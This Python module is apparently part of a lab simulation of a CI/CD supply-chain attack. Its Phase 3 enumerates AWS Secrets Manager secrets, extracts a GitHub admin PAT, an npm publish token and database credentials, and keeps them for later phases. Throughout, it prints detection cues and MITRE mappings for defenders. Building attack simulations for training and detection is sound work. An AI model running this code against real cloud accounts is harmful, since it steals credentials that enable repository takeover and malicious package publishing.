"""
phase_3_credential_theft.py -- Phase 3: Credential Theft

Extract secrets from AWS Secrets Manager, simulating what an attacker's
malicious code does inside the CodeBuild environment. The CodeBuild service
role has broad Secrets Manager permissions (the misconfiguration), allowing
access to ALL secrets under the project prefix -- not just the ones listed
in the buildspec.

The crown jewel: the GitHub Classic PAT with repo + admin:repo_hook scopes.

MITRE ATT&CK Techniques:
  - T1552.001: Unsecured Credentials: Credentials in Files
"""
import json
from typing import Any, Dict, List

import botocore

from config import AttackConfig
from utils import (
    console,
    format_table,
    log_event,
    mark_phase_complete,
    print_detection,
    print_error,
    print_info,
    print_phase_banner,
    print_step,
    print_success,
    print_warning,
)


def list_available_secrets(config: AttackConfig) -> List[Dict[str, str]]:
    """
    Enumerate all secrets in Secrets Manager accessible from the
    CodeBuild service role.

    The role has secretsmanager:ListSecrets permission on all secrets
    under the project prefix (codebreach-lab/*). A properly scoped role
    would only allow access to the specific secret ARNs listed in the
    buildspec, not wildcard access.

    MITRE: T1552.001 (Unsecured Credentials)
    """
    print_step(1, "Enumerating Secrets Manager secrets")

    sm = config.aws_session.client("secretsmanager")

    try:
        response = sm.list_secrets(
            Filters=[
                {
                    "Key": "name",
                    "Values": [config.project_prefix],
                }
            ]
        )
    except botocore.exceptions.ClientError as exc:
        print_error(f"Failed to list secrets: {exc}")
        return []

    secrets = []
    for s in response.get("SecretList", []):
        secrets.append({
            "Name": s.get("Name", ""),
            "Description": s.get("Description", ""),
            "ARN": s.get("ARN", ""),
        })

    if secrets:
        rows = [[s["Name"], s["Description"][:60]] for s in secrets]
        table = format_table(
            "Available Secrets",
            ["Secret Name", "Description"],
            rows,
            ["bright_cyan", "dim"],
        )
        console.print(table)
        print_success(f"Found {len(secrets)} secrets")
    else:
        print_warning("No secrets found")

    log_event(
        "success",
        f"Enumerated {len(secrets)} secrets",
        phase=3,
        step=1,
        data={"secrets": [s["Name"] for s in secrets]},
    )
    return secrets


def extract_github_pat(config: AttackConfig) -> Dict[str, Any]:
    """
    Extract the GitHub automation bot PAT from Secrets Manager.

    This is the crown jewel. In the real CodeBreach attack, this token
    had admin access to the aws-sdk-js-v3 repository and several others.
    The token's repo + admin:repo_hook scopes grant full control over
    all repositories the automation bot can access.

    MITRE: T1552.001 (Unsecured Credentials)
    """
    print_step(2, "Extracting GitHub automation PAT (the crown jewel)")

    sm = config.aws_session.client("secretsmanager")

    try:
        response = sm.get_secret_value(
            SecretId=config.github_automation_secret_name
        )
    except botocore.exceptions.ClientError as exc:
        print_error(f"Failed to get GitHub secret: {exc}")
        return {}

    secret_str = response.get("SecretString", "{}")
    try:
        secret_data = json.loads(secret_str)
    except json.JSONDecodeError:
        print_error("Failed to parse secret JSON")
        return {}

    token = secret_data.get("token", "")
    username = secret_data.get("username", "")

    if token:
        # Store the stolen PAT in config for Phases 4+
        config.set_stolen_github_pat(token)
        print_success(
            f"GITHUB PAT STOLEN: {token[:15]}... "
            f"(user: {username})"
        )
        print_warning(
            "This Classic PAT has repo + admin:repo_hook scopes. "
            "Full control over all accessible repositories."
        )
    else:
        print_error("No token found in secret")

    print_detection(
        "CDR",
        "GetSecretValue called from CI/CD context for GitHub automation secret",
    )
    print_detection(
        "DSPM",
        "GitHub PAT (sensitive credential) accessed from build environment",
    )

    result = {
        "username": username,
        "token_prefix": token[:15] + "..." if token else "",
        "token_length": len(token),
        "note": secret_data.get("note", ""),
    }

    log_event(
        "success",
        "GitHub PAT extracted",
        phase=3,
        step=2,
        data=result,
    )
    return result


def extract_npm_token(config: AttackConfig) -> Dict[str, Any]:
    """
    Extract the npm publish token from Secrets Manager.

    If stolen, this token allows the attacker to publish malicious
    versions of the SDK directly to the npm registry.
    """
    print_step(3, "Extracting npm publish token")

    sm = config.aws_session.client("secretsmanager")

    try:
        response = sm.get_secret_value(
            SecretId=config.npm_token_secret_name
        )
    except botocore.exceptions.ClientError as exc:
        print_error(f"Failed to get npm token secret: {exc}")
        return {}

    secret_str = response.get("SecretString", "{}")
    try:
        secret_data = json.loads(secret_str)
    except json.JSONDecodeError:
        print_error("Failed to parse secret JSON")
        return {}

    token = secret_data.get("token", "")
    registry = secret_data.get("registry", "")

    if token:
        config.set_stolen_npm_token(token)
        print_success(f"npm token stolen: {token[:20]}...")
        print_info(f"Registry: {registry}")
    else:
        print_error("No npm token found in secret")

    result = {
        "token_prefix": token[:20] + "..." if token else "",
        "registry": registry,
    }

    log_event(
        "success",
        "npm publish token extracted",
        phase=3,
        step=3,
        data=result,
    )
    return result


def extract_database_credentials(config: AttackConfig) -> Dict[str, Any]:
    """
    Extract the simulated database credentials from Secrets Manager.

    These represent downstream resources accessible from the CI/CD
    environment -- a common pattern where build pipelines have access
    to production databases for testing or deployment.
    """
    print_step(4, "Extracting database credentials")

    sm = config.aws_session.client("secretsmanager")

    try:
        response = sm.get_secret_value(
            SecretId=config.database_secret_name
        )
    except botocore.exceptions.ClientError as exc:
        print_error(f"Failed to get database secret: {exc}")
        return {}

    secret_str = response.get("SecretString", "{}")
    try:
        secret_data = json.loads(secret_str)
    except json.JSONDecodeError:
        print_error("Failed to parse secret JSON")
        return {}

    host = secret_data.get("host", "")
    database = secret_data.get("database", "")
    username = secret_data.get("username", "")

    print_success(f"Database credentials stolen: {username}@{host}/{database}")

    result = {
        "host": host,
        "database": database,
        "username": username,
        "port": secret_data.get("port", ""),
    }

    log_event(
        "success",
        "Database credentials extracted",
        phase=3,
        step=4,
        data=result,
    )
    return result


def run_phase(config: AttackConfig) -> Dict[str, Any]:
    """
    Execute Phase 3: Credential Theft.

    Extracts all secrets from Secrets Manager.
    """
    print_phase_banner(3, "CREDENTIAL THEFT")

    results = {}

    results["secrets_list"] = list_available_secrets(config)
    results["github_pat"] = extract_github_pat(config)
    results["npm_token"] = extract_npm_token(config)
    results["database"] = extract_database_credentials(config)

    # Summary
    stolen_count = sum(
        1
        for k in ["github_pat", "npm_token", "database"]
        if results.get(k)
    )
    if stolen_count > 0:
        print_success(
            f"Credential theft complete: {stolen_count}/3 secrets extracted"
        )

    print_detection(
        "DSPM",
        "Bulk secret retrieval from Secrets Manager in CI/CD context",
    )

    mark_phase_complete(3)
    return results
